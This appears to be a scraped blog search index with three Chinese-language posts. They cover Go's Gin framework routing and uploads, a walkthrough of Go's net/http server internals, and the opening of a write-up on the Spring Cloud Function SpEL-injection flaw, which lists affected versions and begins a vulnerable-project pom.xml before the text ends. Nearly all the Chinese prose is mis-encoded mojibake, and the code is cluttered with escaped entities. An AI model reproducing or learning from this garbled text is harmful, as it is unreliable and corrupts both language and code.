/userè¿™ç§æ ¼å¼ router.GET(\u0026#34;/user/:name\u0026#34;, func(c *gin.Context) { name := c.Param(\u0026#34;name\u0026#34;) c.String(http.StatusOK, \u0026#34;Hello %s\u0026#34;, name) }) // ä½†æ˜¯ï¼Œè¿™ä¸ªè§„åˆ™æ—¢èƒ½åŒ¹é…/user/john/æ ¼å¼ä¹Ÿèƒ½åŒ¹é…/user/john/sendè¿™ç§æ ¼å¼ // å¦‚æœæ²¡æœ‰å…¶ä»–è·¯ç”±å™¨åŒ¹é…/user/johnï¼Œå®ƒå°†é‡å®šå‘åˆ°/user/john/ router.GET(\u0026#34;/user/:name/*action\u0026#34;, func(c *gin.Context) { name := c.Param(\u0026#34;name\u0026#34;) action := c.Param(\u0026#34;action\u0026#34;) message := name + \u0026#34; is \u0026#34; + action c.String(http.StatusOK, message) }) å¯ä»¥é€šè¿‡:å’Œ*æ¥å®ç°restfulé£æ ¼çš„ä¼ å‚å¹¶è·å–ã€‚ å¸¸è§„è·å–å‚æ•° 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // åŒ¹é…çš„urlæ ¼å¼: /welcome?firstname=Jane\u0026amp;lastname=Doe router.GET(\u0026#34;/welcome\u0026#34;, func(c *gin.Context) { firstname := c.DefaultQuery(\u0026#34;firstname\u0026#34;, \u0026#34;Guest\u0026#34;) lastname := c.Query(\u0026#34;lastname\u0026#34;) // æ˜¯ c.Request.URL.Query().Get(\u0026#34;lastname\u0026#34;) çš„ç®€å†™ c.String(http.StatusOK, \u0026#34;Hello %s %s\u0026#34;, firstname, lastname) }) // ä¼ å…¥çš„post è¯·æ±‚ router.POST(\u0026#34;/form_post\u0026#34;, func(c *gin.Context) { message := c.PostForm(\u0026#34;message\u0026#34;) nick := c.DefaultPostForm(\u0026#34;nick\u0026#34;, \u0026#34;anonymous\u0026#34;) // æ­¤æ–¹æ³•å¯ä»¥è®¾ç½®é»˜è®¤å€¼ c.JSON(200, gin.H{ \u0026#34;status\u0026#34;: \u0026#34;posted\u0026#34;, \u0026#34;message\u0026#34;: message, \u0026#34;nick\u0026#34;: nick, }) }) è·å–getè¯·æ±‚çš„å‚æ•°éœ€è¦ç”¨åˆ°æ–¹æ³•Queryï¼ŒDefaultQueryæ–¹æ³•ä¸ºæŸä¸ªå‚æ•°è®¾ç½®é»˜è®¤å€¼ï¼Œåœ¨æ²¡æœ‰ä¼ å…¥çš„æƒ…å†µä¸‹å­˜åœ¨é»˜è®¤å€¼ã€‚ è·å–POSTçš„å‚æ•°ç”¨çš„æ–¹æ³•PostFormè·å–æäº¤çš„æ•°æ®ï¼ŒDefaultPostFormåŒæ ·ä¸ºè®¾ç½®é»˜è®¤å€¼ã€‚ ä¸Šä¼ æ–‡ä»¶ ginå¯¹fileå°è£…çš„è¾ƒä¸ºå®Œå–„ï¼Œæ–‡ä»¶ä¸Šä¼ ç”¨èµ·æ¥ä¹Ÿæ¯”è¾ƒæ–¹ä¾¿ï¼Œå¯¹äºå•ä¸ªæ–‡ä»¶ï¼Œç›´æ¥é€šè¿‡FormFileè·å–ä¼ å…¥å¯¹åº”çš„æ–‡ä»¶åå³å¯ï¼Œå¯¹äºä¸Šä¼ çš„å¤šä¸ªæ–‡ä»¶ï¼Œå°†å…¶è½¬åŒ–ä¸ºæ–‡ä»¶æ•°ç»„å³å¯ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // ç»™è¡¨å•é™åˆ¶ä¸Šä¼ å¤§å° (é»˜è®¤ 32 MiB) // router.MaxMultipartMemory = 8 \u0026lt;\u0026lt; 20 // 8 MiB router.POST(\u0026#34;/upload\u0026#34;, func(c *gin.Context) { // å•æ–‡ä»¶ file, _ := c.FormFile(\u0026#34;file\u0026#34;) log.Println(file.Filename) // å¤šæ–‡ä»¶ form, _ := c.MultipartForm() files := form.File[\u0026#34;upload[]\u0026#34;] for _, file := range files { log.Println(file.Filename) } // ä¸Šä¼ æ–‡ä»¶åˆ°æŒ‡å®šçš„è·¯å¾„ // c.SaveUploadedFile(file, dst) c.String(http.StatusOK, fmt.Sprintf(\u0026#34;\u0026#39;%s\u0026#39; uploaded!\u0026#34;, file.Filename)) }) ç›®å½•ç»“æ„è®¾è®¡ ä»ä¸Šåˆ°ä¸‹ç›®å½•ç»“æ„ä¸º:\næ–‡ä»¶ æ¦‚è¦ config é…ç½®æ–‡ä»¶å¯¹åº”çš„ç»“æ„ä½“å®šä¹‰ controller ä¸šåŠ¡å±‚ dao æ“ä½œæ•°æ®åº“,ç»™ä¸šåŠ¡controlleræä¾›æ•°æ® forms å­—æ®µéªŒè¯çš„struct global å®šä¹‰å…¨å±€å˜é‡ initialize æœåŠ¡åˆå§‹åŒ– logs æ—¥å¿—å­˜å‚¨ middlewares ä¸­é—´ä»¶ models æ•°æ®åº“å­—æ®µå®šä¹‰ Response ç»Ÿä¸€å°è£…response static èµ„æºæ–‡ä»¶å¤¹ router è·¯ç”± setting-dev.yaml é…ç½®æ–‡ä»¶ main.go æœåŠ¡å¯åŠ¨æ–‡ä»¶ ","permalink":"http://www.reus09.top/posts/tech/gin/","summary":"å¯¹å¼€æºçš„å¼€å‘æ¡†æ¶ginè¿›è¡Œäº†ç®€å•çš„å­¦ä¹ ï¼Œå¯¹å¸¸ç”¨çš„è¿›è¡Œäº†ç®€å•çš„æ•´ç†ã€‚ åˆå§‹åŒ– è¿™é‡Œç›´æ¥ç»™å‡ºä¸€ä¸ªé€šç”¨çš„æ¨¡æ¿ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21","title":"Gin"},{"content":"å¾ˆé•¿æ—¶é—´æ²¡æœ‰æ°´åšå®¢äº†ï¼Œå‰äº›å¤©å­¦ä¹ äº†ä¸€ä¸‹goçš„è¯­æ³•ã€‚goå‡­å€Ÿå…¶è½»é‡çº§å’Œå¹¶å‘æ€§çš„åŸå› ï¼Œæ€§èƒ½è¶Šæ¥è¶Šä¼˜å¼‚ï¼Œè¿™é‡Œç®€å•åˆ†æä¸€ä¸‹å¦‚ä½•é€šè¿‡goåŸç”Ÿçš„httpå¼€å¯ä¸€ä¸ªwebæœåŠ¡ï¼Œå¹¶å¯¹å…¶è¿‡ç¨‹è¿›è¡Œä¸€å®šçš„å‰–æã€‚\ngoåŸç”Ÿçš„webæœåŠ¡æ­å»º Go è¯­è¨€é‡Œé¢æä¾›äº†ä¸€ä¸ªå®Œå–„çš„ net/http åŒ…ï¼Œé€šè¿‡ http åŒ…å¯ä»¥å¾ˆæ–¹ä¾¿çš„å°±æ­å»ºèµ·æ¥ä¸€ä¸ªå¯ä»¥è¿è¡Œçš„ Web æœåŠ¡ã€‚åŒæ—¶ä½¿ç”¨è¿™ä¸ªåŒ…èƒ½å¾ˆç®€å•åœ°å¯¹ Web çš„è·¯ç”±ï¼Œé™æ€æ–‡ä»¶ï¼Œæ¨¡ç‰ˆï¼Œcookie ç­‰æ•°æ®è¿›è¡Œè®¾ç½®å’Œæ“ä½œã€‚\næ¯”å¦‚è¯´ï¼Œç»™å®šä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;strings\u0026#34; \u0026#34;log\u0026#34; ) func sayhelloName(w http.ResponseWriter, r *http.Request) { r.ParseForm() // è§£æå‚æ•°ï¼Œé»˜è®¤æ˜¯ä¸ä¼šè§£æçš„ fmt.Println(r.Form) // è¿™äº›ä¿¡æ¯æ˜¯è¾“å‡ºåˆ°æœåŠ¡å™¨ç«¯çš„æ‰“å°ä¿¡æ¯ fmt.Println(\u0026#34;path\u0026#34;, r.URL.Path) fmt.Println(\u0026#34;scheme\u0026#34;, r.URL.Scheme) fmt.Println(r.Form[\u0026#34;url_long\u0026#34;]) for k, v := range r.Form { fmt.Println(\u0026#34;key:\u0026#34;, k) fmt.Println(\u0026#34;val:\u0026#34;, strings.Join(v, \u0026#34;\u0026#34;)) } fmt.Fprintf(w, \u0026#34;Hello astaxie!\u0026#34;) // è¿™ä¸ªå†™å…¥åˆ° w çš„æ˜¯è¾“å‡ºåˆ°å®¢æˆ·ç«¯çš„ } func main() { http.HandleFunc(\u0026#34;/\u0026#34;, sayhelloName) // è®¾ç½®è®¿é—®çš„è·¯ç”± err := http.ListenAndServe(\u0026#34;:9090\u0026#34;, nil) // è®¾ç½®ç›‘å¬çš„ç«¯å£ if err != nil { log.Fatal(\u0026#34;ListenAndServe: \u0026#34;, err) } } é€šè¿‡æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡httpåŒ…ä¸‹é¢çš„ä¸¤ä¸ªå‡½æ•°HandleFuncå’ŒListenAndServerå‡½æ•°å¯ä»¥å¼€å¯ä¸€ä¸ªwebæœåŠ¡å™¨ã€‚å¹¶ä¸”åœ¨HandleFuncä¸­æˆ‘ä»¬å¯ä»¥æŒ‡å®šæˆ‘ä»¬è¯¥è·¯ç”±ä¸‹é¢çš„å¤„ç†æ–¹æ³•ã€‚ httpåŒ…æ‰§è¡Œæµç¨‹ å¦‚å›¾ï¼Œä¸ºGoå®ç°WebæœåŠ¡çš„æµç¨‹å›¾ã€‚\n1ã€åœ¨æœåŠ¡å™¨ç«¯åˆ›å»ºä¸€ä¸ªListen Socket ï¼Œç›‘å¬æŒ‡å®šçš„ç«¯å£ï¼Œç­‰åˆ°å®¢æˆ·ç«¯è®¿é—® 2ã€Listen Socketæ¥æ”¶åˆ°å®¢æˆ·ç«¯accept,å°±ä¼šç”Ÿæˆä¸€ä¸ªClient Socket,ä¹‹åæ‰€æœ‰çš„ä¼šè¯éƒ½ç”±Client Socket äº å®¢æˆ·ç«¯é€šä¿¡ã€‚ 3ã€å»ºç«‹è¿æ¥åï¼Œå¤„ç†å®¢æˆ·ç«¯çš„è¯·æ±‚æ—¶ã€‚é¦–å…ˆä» Client Socket è¯»å– HTTP è¯·æ±‚çš„åè®®å¤´ï¼Œå¦‚æœæ˜¯ POST æ–¹æ³•ï¼Œè¿˜å¯èƒ½è¦è¯»å–å®¢æˆ·ç«¯æäº¤çš„æ•°æ®ï¼Œç„¶åäº¤ç»™ç›¸åº”çš„ handler å¤„ç†è¯·æ±‚ï¼Œhandler å¤„ç†å®Œæ¯•å‡†å¤‡å¥½å®¢æˆ·ç«¯éœ€è¦çš„æ•°æ®ï¼Œé€šè¿‡ Client Socket å†™ç»™å®¢æˆ·ç«¯ã€‚(è¿™é‡Œçš„handlerå³ä¸ºæˆ‘ä»¬è‡ªå®šä¹‰çš„å‡½æ•°) å¦‚ä½•ç›‘å¬ç«¯å£ Go æ˜¯é€šè¿‡ä¸€ä¸ªå‡½æ•° ListenAndServe æ¥å¤„ç†è¿™äº›äº‹æƒ…çš„ï¼Œè¿™ä¸ªåº•å±‚å…¶å®è¿™æ ·å¤„ç†çš„ï¼šåˆå§‹åŒ–ä¸€ä¸ª server å¯¹è±¡ï¼Œç„¶åè°ƒç”¨äº† net.Listen(\u0026ldquo;tcp\u0026rdquo;, addr)ï¼Œä¹Ÿå°±æ˜¯åº•å±‚ç”¨ TCP åè®®æ­å»ºäº†ä¸€ä¸ªæœåŠ¡ï¼Œç„¶åç›‘æ§æˆ‘ä»¬è®¾ç½®çš„ç«¯å£ã€‚\næˆ‘ä»¬é€šè¿‡æŸ¥çœ‹ListenAndServeå¯ä»¥çœ‹åˆ°,ç¡®å®å¦‚æ­¤ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 func (srv *Server) ListenAndServe() error { if srv.shuttingDown() { return ErrServerClosed } addr := srv.Addr if addr == \u0026#34;\u0026#34; { addr = \u0026#34;:http\u0026#34; } ln, err := net.Listen(\u0026#34;tcp\u0026#34;, addr) if err != nil { return err } return srv.Serve(ln) } å¤„ç†è¯·æ±‚ ç„¶åï¼Œå»ºç«‹ç›‘æ§ä¹‹åï¼Œgoé€šè¿‡srv.Server(ln)æ–¹æ³•æ¥å®ç°\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 func (srv *Server) Serve(l net.Listener) error { if fn := testHookServerServe; fn != nil { fn(srv, l) // call hook with unwrapped listener } origListener := l l = \u0026amp;onceCloseListener{Listener: l} defer l.Close() if err := srv.setupHTTP2_Serve(); err != nil { return err } if !srv.trackListener(\u0026amp;l, true) { return ErrServerClosed } defer srv.trackListener(\u0026amp;l, false) baseCtx := context.Background() if srv.BaseContext != nil { baseCtx = srv.BaseContext(origListener) if baseCtx == nil { panic(\u0026#34;BaseContext returned a nil context\u0026#34;) } } var tempDelay time.Duration // how long to sleep on accept failure ctx := context.WithValue(baseCtx, ServerContextKey, srv) for { rw, err := l.Accept() if err != nil { select { case \u0026lt;-srv.getDoneChan(): return ErrServerClosed default: } if ne, ok := err.(net.Error); ok \u0026amp;\u0026amp; ne.Temporary() { if tempDelay == 0 { tempDelay = 5 * time.Millisecond } else { tempDelay *= 2 } if max := 1 * time.Second; tempDelay \u0026gt; max { tempDelay = max } srv.logf(\u0026#34;http: Accept error: %v; retrying in %v\u0026#34;, err, tempDelay) time.Sleep(tempDelay) continue } return err } connCtx := ctx if cc := srv.ConnContext; cc != nil { connCtx = cc(connCtx, rw) if connCtx == nil { panic(\u0026#34;ConnContext returned nil\u0026#34;) } } tempDelay = 0 c := srv.newConn(rw) c.setState(c.rwc, StateNew, runHooks) // before Serve can return go c.serve(connCtx) } } è¿™ä¸ªå‡½æ•°å°±æ˜¯ç”¨æ¥å¤„ç†å®¢æˆ·ç«¯çš„è¯·æ±‚ä¿¡æ¯ã€‚é‡Œé¢æœ‰ä¸€ä¸ªforå¾ªç¯ï¼Œé€šè¿‡Listeneræ¥æ”¶æ•°æ®ï¼Œç„¶ååˆ›å»ºä¸€ä¸ªConn,æœ€åé€šè¿‡go c.server()æ¥ä¿è¯é«˜å¹¶å‘ï¼Œä½¿ç”¨æˆ·çš„æ¯ä¸€æ¬¡è¯·æ±‚éƒ½åœ¨ä¸€ä¸ªæ–°çš„goroutineå»æœåŠ¡ï¼Œç›¸äº’ä¸å½±å“ã€‚\nåˆ†é…å‡½æ•°å¤„ç†è¯·æ±‚ åœ¨c.server()ä¸­ï¼Œå¯¹è¯·æ±‚åšä¸€ä¸‹å¤„ç†ï¼Œæ‰¾åˆ°å¯¹åº”çš„handler\n1 2 w, err := c.readRequest(ctx) serverHandler{c.server}.ServeHTTP(w, w.req) conn é¦–å…ˆä¼šè§£æ request:c.readRequest(), ç„¶åè·å–ç›¸åº”çš„ handler:handler := c.server.Handlerï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬åˆšæ‰åœ¨è°ƒç”¨å‡½æ•° ListenAndServe æ—¶å€™çš„ç¬¬äºŒä¸ªå‚æ•°ã€‚\nè¿›ä¸€æ­¥æŸ¥çœ‹ServerHTTPå¦‚ä½•æ‰¾åˆ°å¯¹åº”çš„Handler\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 func (sh serverHandler) ServeHTTP(rw ResponseWriter, req *Request) { handler := sh.srv.Handler if handler == nil { handler = DefaultServeMux } if req.RequestURI == \u0026#34;*\u0026#34; \u0026amp;\u0026amp; req.Method == \u0026#34;OPTIONS\u0026#34; { handler = globalOptionsHandler{} } if req.URL != nil \u0026amp;\u0026amp; strings.Contains(req.URL.RawQuery, \u0026#34;;\u0026#34;) { var allowQuerySemicolonsInUse int32 req = req.WithContext(context.WithValue(req.Context(), silenceSemWarnContextKey, func() { atomic.StoreInt32(\u0026amp;allowQuerySemicolonsInUse, 1) })) defer func() { if atomic.LoadInt32(\u0026amp;allowQuerySemicolonsInUse) == 0 { sh.srv.logf(\u0026#34;http: URL query contains semicolon, which is no longer a supported separator; parts of the query may be stripped when parsed; see golang.org/issue/25192\u0026#34;) } }() } handler.ServeHTTP(rw, req) } æˆ‘ä»¬å‰é¢ä¾‹å­ä¼ é€’çš„æ˜¯ nilï¼Œä¹Ÿå°±æ˜¯ä¸ºç©ºï¼Œé‚£ä¹ˆé»˜è®¤è·å– handler = DefaultServeMux, è¿™ä¸ªå˜é‡å°±æ˜¯ä¸€ä¸ªè·¯ç”±å™¨ï¼Œå®ƒç”¨æ¥åŒ¹é… url è·³è½¬åˆ°å…¶ç›¸åº”çš„ handle å‡½æ•°ï¼Œæˆ‘ä»¬é€šè¿‡è°ƒç”¨http.HandleFunc(\u0026quot;/\u0026quot;, sayhelloName) æ¥ç”Ÿæˆä¸€ä¸ªhandlerã€‚è¿™ä¸ªä½œç”¨å°±æ˜¯æ³¨å†Œäº†è¯·æ±‚ / çš„è·¯ç”±è§„åˆ™ï¼Œå½“è¯·æ±‚ uri ä¸º \u0026ldquo;/\u0026quot;ï¼Œè·¯ç”±å°±ä¼šè½¬åˆ°å‡½æ•° sayhelloNameï¼ŒDefaultServeMux ä¼šè°ƒç”¨ ServeHTTP æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•å†…éƒ¨å…¶å®å°±æ˜¯è°ƒç”¨ sayhelloName æœ¬èº«ï¼Œæœ€åé€šè¿‡å†™å…¥ response çš„ä¿¡æ¯åé¦ˆåˆ°å®¢æˆ·ç«¯ã€‚\nServeMuxçš„è‡ªå®šä¹‰ ä¸Šé¢è®²è¿°ä¼ å…¥çš„handlerä¸ºnilçš„æ—¶å€™ï¼Œå°±ä¼šè°ƒç”¨httpé»˜è®¤çš„è·¯ç”±å™¨ï¼Œé€šè¿‡è·¯ç”±å™¨å°†è¯·æ±‚ä¼ é€’åˆ°åç«¯å¤„ç†å‡½æ•°ã€‚\nç»“æ„å¦‚ä¸‹ï¼š\n1 2 3 4 5 type ServeMux struct { mu sync.RWMutex // é”ï¼Œç”±äºè¯·æ±‚æ¶‰åŠåˆ°å¹¶å‘å¤„ç†ï¼Œå› æ­¤è¿™é‡Œéœ€è¦ä¸€ä¸ªé”æœºåˆ¶ m map[string]muxEntry // è·¯ç”±è§„åˆ™ï¼Œä¸€ä¸ª string å¯¹åº”ä¸€ä¸ª mux å®ä½“ï¼Œè¿™é‡Œçš„ string å°±æ˜¯æ³¨å†Œçš„è·¯ç”±è¡¨è¾¾å¼ hosts bool // æ˜¯å¦åœ¨ä»»æ„çš„è§„åˆ™ä¸­å¸¦æœ‰ host ä¿¡æ¯ } ä¸‹é¢çœ‹ä¸€ä¸‹å•ŠmuxEntry:\n1 2 3 4 5 type muxEntry struct { explicit bool // æ˜¯å¦ç²¾ç¡®åŒ¹é… h Handler // è¿™ä¸ªè·¯ç”±è¡¨è¾¾å¼å¯¹åº”å“ªä¸ª handler pattern string // åŒ¹é…å­—ç¬¦ä¸² } æ¥ç€çœ‹ä¸€ä¸‹ Handler :\n1 2 3 type Handler interface { ServeHTTP(ResponseWriter, *Request) // è·¯ç”±å®ç°å™¨ } ä¸‹å›¾æ˜¯é€šè¿‡debugè·å–çš„å°è£…åˆ°é»˜è®¤è·¯ç”±å™¨çš„ä¿¡æ¯ã€‚\nè¯¦ç»†ä»‹ç»ä¸€ä¸‹å¦‚ä½•å°†æˆ‘ä»¬ä¼ å…¥çš„å‡½æ•°å°è£…ä¸ºæˆ‘ä»¬è·¯ç”±å¯¹åº”çš„handlerã€‚\né¦–å…ˆï¼Œåœ¨httpåŒ…é‡Œé¢å®šä¹‰ä¸€ä¸ªç±»å‹HandleFuncï¼Œæˆ‘ä»¬å®šä¹‰çš„å‡½æ•°sayhelloNameå°±æ˜¯å…¶è°ƒç”¨ä¹‹åçš„ç»“æœï¼Œè¿™ä¸ªç±»å‹é»˜è®¤å°±å®ç°äº† ServeHTTP è¿™ä¸ªæ¥å£ï¼Œå³æˆ‘ä»¬è°ƒç”¨äº† HandlerFunc (f), å¼ºåˆ¶ç±»å‹è½¬æ¢ f æˆä¸º HandlerFunc ç±»å‹ï¼Œè¿™æ · f å°±æ‹¥æœ‰äº† ServeHTTP æ–¹æ³•ã€‚\n1 2 3 4 5 6 7 type HandlerFunc func(ResponseWriter, *Request) // ServeHTTP calls f(w, r). func (f HandlerFunc) ServeHTTP(w ResponseWriter, r *Request) { f(w, r) } 1 2 3 4 5 6 7 8 // HandleFunc registers the handler function for the given pattern. func (mux *ServeMux) HandleFunc(pattern string, handler func(ResponseWriter, *Request)) { if handler == nil { panic(\u0026#34;http: nil handler\u0026#34;) } // å°†f()ç±»å‹å¼ºè½¬åŒ–ä¸º`HandleFunc` mux.Handle(pattern, HandlerFunc(handler)) } è¿™æ ·è·¯ç”±å™¨å°±å­˜å‚¨äº†å¯¹åº”çš„è·¯ç”±è§„åˆ™ï¼Œé»˜è®¤è·¯ç”±å™¨çš„ServeHTTPå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 func (mux *ServeMux) ServeHTTP(w ResponseWriter, r *Request) { if r.RequestURI == \u0026#34;*\u0026#34; { w.Header().Set(\u0026#34;Connection\u0026#34;, \u0026#34;close\u0026#34;) w.WriteHeader(StatusBadRequest) return } h, _ := mux.Handler(r) h.ServeHTTP(w, r) } å¦‚æœä¼ å…¥URIä¸º*,é‚£ä¹ˆå°±å…³é—­é“¾æ¥ï¼Œå¦åˆ™è°ƒç”¨mux.Handler(r)ï¼Œè¿”å›æˆ‘ä»¬è®¾ç½®è·¯ç”±çš„Handler,ç„¶åè°ƒç”¨ä»–çš„ServerHTTP(w,r) åˆ†æä¸€ä¸‹ï¼Œå¦‚ä½•é€šè¿‡mux.Handler(r)æ¥æ‰¾åˆ°æˆ‘ä»¬å¯¹åº”çš„è·¯ç”±\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 func (mux *ServeMux) Handler(r *Request) (h Handler, pattern string) { // åˆ¤æ–­æ–¹æ³•æ˜¯å¦ä¸ºCONNECT if r.Method != \u0026#34;CONNECT\u0026#34; { if p := cleanPath(r.URL.Path); p != r.URL.Path { _, pattern = mux.handler(r.Host, p) return RedirectHandler(p, StatusMovedPermanently), pattern } } // ä¸æ˜¯CONNECTçš„è¯ï¼Œå°±è°ƒç”¨è‡ªå·±çš„hanlder return mux.handler(r.Host, r.URL.Path) } func (mux *ServeMux) handler(host, path string) (h Handler, pattern string) { mux.mu.RLock() defer mux.mu.RUnlock() // é€šè¿‡host + path åœ¨muä¸­åŒ¹é…è‡ªå·±çš„handler // Host-specific pattern takes precedence over generic ones if mux.hosts { h, pattern = mux.match(host + path) } if h == nil { h, pattern = mux.match(path) } if h == nil { h, pattern = NotFoundHandler(), \u0026#34;\u0026#34; } return } å‘ç°å…¶æ˜¯æ ¹æ®ç”¨æˆ·è¯·æ±‚çš„ URL å’Œè·¯ç”±å™¨é‡Œé¢å­˜å‚¨çš„ map å»åŒ¹é…çš„ï¼Œå½“åŒ¹é…åˆ°ä¹‹åè¿”å›å­˜å‚¨çš„ handlerï¼Œè°ƒç”¨è¿™ä¸ª handler çš„ ServeHTTP æ¥å£å°±å¯ä»¥æ‰§è¡Œåˆ°ç›¸åº”çš„å‡½æ•°äº†ã€‚\nA åˆ¤æ–­æ˜¯å¦æœ‰è·¯ç”±èƒ½æ»¡è¶³è¿™ä¸ª requestï¼ˆå¾ªç¯éå† ServeMux çš„ muxEntryï¼‰ B å¦‚æœæœ‰è·¯ç”±æ»¡è¶³ï¼Œè°ƒç”¨è¿™ä¸ªè·¯ç”± handler çš„ ServeHTTP C å¦‚æœæ²¡æœ‰è·¯ç”±æ»¡è¶³ï¼Œè°ƒç”¨ NotFoundHandler çš„ ServeHTTP ","permalink":"http://www.reus09.top/posts/tech/go%E5%8E%9F%E7%94%9Fnet%E5%8C%85%E5%88%86%E6%9E%90/","summary":"å¾ˆé•¿æ—¶é—´æ²¡æœ‰æ°´åšå®¢äº†ï¼Œå‰äº›å¤©å­¦ä¹ äº†ä¸€ä¸‹goçš„è¯­æ³•ã€‚goå‡­å€Ÿå…¶è½»é‡çº§å’Œå¹¶å‘æ€§çš„åŸå› ï¼Œæ€§èƒ½è¶Šæ¥è¶Šä¼˜å¼‚ï¼Œè¿™é‡Œç®€å•åˆ†æä¸€ä¸‹å¦‚ä½•é€šè¿‡goåŸç”Ÿçš„http","title":"GoåŸç”ŸnetåŒ…åˆ†æ"},{"content":"æ¼æ´ä»‹ç» Spring Cloud Function æ˜¯åŸºäº Spring Boot çš„å‡½æ•°è®¡ç®—æ¡†æ¶ã€‚è¯¥é¡¹ç›®è‡´åŠ›äºä¿ƒè¿›å‡½æ•°ä¸ºä¸»çš„å¼€å‘å•å…ƒï¼Œå®ƒæŠ½è±¡å‡ºæ‰€æœ‰ä¼ è¾“ç»†èŠ‚å’ŒåŸºç¡€æ¶æ„ï¼Œå¹¶æä¾›ä¸€ä¸ªé€šç”¨çš„æ¨¡å‹ï¼Œç”¨äºåœ¨å„ç§å¹³å°ä¸Šéƒ¨ç½²åŸºäºå‡½æ•°çš„è½¯ä»¶ã€‚ ç”±äºSpring Cloud Functionå­˜åœ¨SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´ã€‚è¿œç¨‹æ”»å‡»è€…æ— éœ€è®¤è¯å³å¯æ„é€ ç‰¹å®šçš„æ•°æ®åŒ…ï¼Œå¹¶é€šè¿‡ç‰¹å®šçš„ HTTP è¯·æ±‚å¤´æ³¨å…¥ SpEL è¡¨è¾¾å¼ã€‚æœ€ç»ˆå¯å¯¼è‡´è¿œç¨‹æ‰§è¡Œä»»æ„ä»£ç ï¼Œè·å–æœåŠ¡å™¨æƒé™ã€‚ é£é™©ç­‰çº§ï¼šé«˜é£é™© æ¼æ´é£é™©ï¼šæ”»å‡»è€…åˆ©ç”¨è¯¥æ¼æ´å¯å¯¼è‡´è¿œç¨‹æ‰§è¡Œä»»æ„ä»£ç ï¼Œè·å–æœåŠ¡å™¨æƒé™ å½±å“ç‰ˆæœ¬ Spring Cloud Function =\u0026lt; 3.1.6 Spring Cloud Function =\u0026lt; 3.2.2 å®‰å…¨ç‰ˆæœ¬ Spring Cloud Function \u0026gt;= 3.1.7 Spring Cloud Function \u0026gt;= 3.2.3 SpringCloud Functionä»‹ç» SpringCloud æ˜¯ä¸€å¥—åˆ†å¸ƒå¼ç³»ç»Ÿçš„è§£å†³æ–¹æ¡ˆï¼Œå¸¸è§çš„è¿˜æœ‰é˜¿é‡Œå·´å·´çš„Dubboï¼ŒFassï¼ˆFunction As A Service ï¼‰çš„åº•å±‚å®ç°å°±æ˜¯å‡½æ•°å¼ç¼–ç¨‹ï¼Œåœ¨è§†é¢‘è½¬ç ã€éŸ³è§†é¢‘è½¬æ¢ã€æ•°æ®ä»“åº“ETLç­‰ä¸çŠ¶æ€ç›¸å…³åº¦ä½çš„é¢†åŸŸè¿ç”¨çš„æ¯”è¾ƒå¤šã€‚å¼€å‘è€…æ— éœ€å…³æ³¨æœåŠ¡å™¨ç¯å¢ƒè¿ç»´ç­‰é—®é¢˜ä¸Šï¼Œä¸“æ³¨äºè‡ªèº«ä¸šåŠ¡é€»è¾‘å®ç°å³å¯ã€‚ SpringCloud Function å°±æ˜¯Springæä¾›çš„åˆ†å¸ƒå¼å‡½æ•°å¼ç¼–ç¨‹ç»„ä»¶ã€‚ æ¼æ´ç¯å¢ƒæ­å»º é€šè¿‡ideaæ–°å»ºä¸€ä¸ªSpringé¡¹ç›®ï¼Œpomä¸­å¼•å…¥spring-boot-starter-webã€spring-cloud-function-webï¼Œå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;project xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xmlns=\u0026#34;http://maven.apache.org/POM/4.0.0\u0026#34; xsi:schemaLocation=\u0026#34;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd\u0026#34;\u0026gt; \u0026lt;modelVersion\u0026gt;4.0.0\u0026lt;/modelVersion\u0026gt; \u0026lt;groupId\u0026gt;io.spring.sample\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;function-sample-pojo\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.2.1.RELEASE\u0026lt;/version\u0026gt; \u0026lt;packaging\u0026gt;jar\u0026lt;/packaging\u0026gt; \u0026lt;name\u0026gt;function-sample-pojo\u0026lt;/name\u0026gt; \u0026lt;description\u0026gt;Spring Cloud Function Web Support\u0026lt;/description\u0026gt; \u0026lt;parent\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-parent\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.0.0-SNAPSHOT\u0026lt;/version\u0026gt; \u0026lt;relativePath/\u0026gt; \u0026lt;/parent\u0026gt; \u0026lt;properties\u0026gt; 